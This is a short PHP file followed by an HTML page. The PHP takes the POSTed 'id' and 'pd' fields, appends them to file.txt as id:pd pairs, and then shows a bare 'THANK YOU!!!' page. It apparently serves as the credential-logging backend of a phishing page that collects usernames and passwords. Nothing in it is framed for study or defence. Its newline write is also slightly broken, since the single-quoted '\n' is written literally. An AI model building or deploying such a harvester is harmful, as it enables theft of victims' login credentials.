<?php
$handle = fopen("file.txt","a");
fwrite($handle,$_POST['id'] );
fwrite($handle, ":");
fwrite($handle,$_POST['pd'] );
fwrite($handle, '\n');
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<p style="font-size: 20px">THANK YOU!!!</p>
</body>
</html>